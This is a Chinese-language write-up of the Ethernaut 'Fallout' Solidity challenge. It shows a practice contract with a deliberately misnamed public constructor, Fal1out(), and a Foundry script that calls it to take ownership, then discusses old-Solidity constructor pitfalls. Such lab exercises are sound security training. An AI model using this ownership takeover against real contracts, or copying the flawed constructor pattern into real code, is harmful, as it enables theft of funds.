# Level 2 - Fallout
## 題目
[Fallout](https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639)

### 通關條件
獲得下面合約的所有權來完成這一關
可能會有用的資訊：Solidity, Remix IDE
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
## 解題
這題的目標跟上一題是一樣的，取代合約的 onwer，那可以在第 14 行看到 `owner = msg.sender` 也就是說只要呼叫 `Fal1out()` 就可以取代 owner 了，攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/02_Fallout.sol";

contract ExploitScript is Script {
    Fallout level2 = Fallout(payable(your_challenge_address));

    function run() public {
        vm.startBroadcast();

        level2.Fal1out();

        vm.stopBroadcast();
    }
}
```
這一題主要是想考 `constructor()` 以及舊版 Solidity 的一些安全問題，但是在現在其實不太會碰到了，對於 `constructor()` 的用法以及歷史可以參考以下文章：
- [[中文] WTF Solidity极简入门: 11. 构造函数和修饰器](https://github.com/AmazingAng/WTF-Solidity/tree/main/11_Modifier)
- [[EN] Solidity by Example](https://solidity-by-example.org/constructor/)